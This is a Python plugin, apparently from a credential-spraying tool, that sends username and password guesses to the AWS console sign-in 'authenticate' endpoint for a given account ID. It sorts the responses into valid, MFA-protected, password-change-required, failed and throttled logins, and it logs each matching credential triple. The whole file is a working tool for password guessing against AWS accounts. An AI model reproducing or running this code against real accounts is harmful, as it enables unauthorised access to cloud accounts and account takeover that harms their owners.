class Plugin:
    def __init__(self, requester, pluginargs):
        self.requester = requester
        self.pluginargs = pluginargs
    
    def validate(self):
        #
        # Plugin Args
        #
        # --account_id XXXXXXXXXXXX         ->  Account Identifier
        #
        err = None
        self.pluginargs["url"] = "https://signin.aws.amazon.com"

        if not 'account_id' in self.pluginargs.keys():
            err = "Plugin AWS needs 'account_id' plugin argument. Please specify it in the configuration file"
        return 'account_id' in self.pluginargs.keys(), err

    def testconnect(self, useragent):
        headers = {
            "User-Agent" : useragent,
        }
        resp = self.requester.get(self.pluginargs["url"], headers=headers)
        
        return resp.status_code != 504

    def test_authenticate(self, username, password, useragent):
        data_response = {
            "result": None,
            "error": False,
            "output": "Blah",
            'request': None
        }
            
        account = self.pluginargs["account_id"]

        body = {
            "action": "iam-user-authentication",
            "account": account,
            "username": username,
            "password": password,
            "client_id": "arn:aws:signin:::console/canvas",
            "redirect_uri": "https://console.aws.amazon.com/console/home"
        }

        headers = {
                "User-Agent": useragent,
        }

        try:
            resp = self.requester.post(f"{self.pluginargs['url']}/authenticate", data=body, headers=headers)
            data_response['request'] = resp
            if resp.status_code == 200:
                resp_json = resp.json()

                if resp_json.get("state") == "SUCCESS":

                    if resp_json["properties"]["result"] == "SUCCESS":
                        data_response['result'] = "success"
                        data_response['output'] = f"[+] SUCCESS: => {account}:{username}:{password}"

                    elif resp_json["properties"]["result"] == "MFA":
                        data_response['result'] = "potential"
                        data_response['output'] = f"[+] SUCCESS: 2FA => {account}:{username}:{password} - Note: it does not mean that the password is correct"

                    elif resp_json["properties"]["result"] == "CHANGE_PASSWORD":
                        data_response['result'] = "success"
                        data_response['output'] = f"[+] SUCCESS: Asking for password changing => {account}:{username}:{password}"

                    else:
                        result = resp_json["properties"]["result"]
                        data_response['output'] = f"[?] Unknown Response : ({result}) {account}:{username}:{password}"
                        data_response['result'] = "failure"

                elif resp_json.get("state") == "FAIL":
                    data_response['output'] = f"[!] FAIL: => {account}:{username}:{password}"
                    data_response['result'] = "failure"
                
                else:
                    data_response['output'] = f"[?] Unknown Response : {account}:{username}:{password}"
                    data_response['result'] = "failure"

            elif resp.status_code == 403:
                    data_response['result'] = "failure"
                    data_response['output'] = f"[-] FAILURE THROTTLE INDICATED: {resp.status_code} => {account}:{username}:{password}"

            else:
                data_response['result'] = "failure"
                data_response['output'] = f"[-] FAILURE: {resp.status_code} => {account}:{username}:{password}"


        except Exception as ex:
            data_response['error'] = True
            data_response['output'] = str(ex.__repr__())
            pass

        return data_response